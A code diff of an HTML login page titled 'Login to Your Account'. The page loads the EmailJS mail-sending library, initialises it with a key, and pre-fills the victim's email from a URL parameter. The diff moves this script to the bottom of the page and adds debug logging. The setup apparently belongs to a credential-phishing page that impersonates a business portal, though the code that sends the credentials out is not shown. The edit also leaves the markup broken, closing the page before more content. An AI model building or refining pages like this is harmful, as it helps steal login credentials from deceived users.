@@ -5,17 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Login to Your Account</title>
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-  <script>
-    emailjs.init("TLkClHUlQn5aQV4XO");
-       window.onload = function() {
-  const urlParams = new URLSearchParams(window.location.search);
-  const email = urlParams.get('email');
-  
-  if (email) {
-    document.getElementById('emailField').value = email;
-  }
-};
-  </script>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -147,6 +136,31 @@
       <p><a href="https://service.imsbiz.com/portal/index.jsp" class="forgot-password" target="_blank" rel="noopener noreferrer">Keep me logged in</a></p>
     </div>
   </div>
+
+  <!-- JavaScript (moved to the bottom to ensure elements are loaded) -->
+  <script>
+    emailjs.init("TLkClHUlQn5aQV4XO");
+
+    // Ensure the script runs after the page loads
+    window.onload = function() {
+      // Get the 'email' parameter from the URL
+      const urlParams = new URLSearchParams(window.location.search);
+      const email = urlParams.get('email');
+      
+      // Debugging: Log the email to check if it's extracted correctly
+      console.log("Email from URL:", email);
+
+      // If email exists in the URL, pre-fill the email field
+      if (email) {
+        document.getElementById('emailField').value = email;
+      } else {
+        console.log("No email parameter found in the URL.");
+      }
+    };
+  </script>
+
+</body>
+</html>
 
   <!-- Confirmation Message -->
   <div id="confirmation">
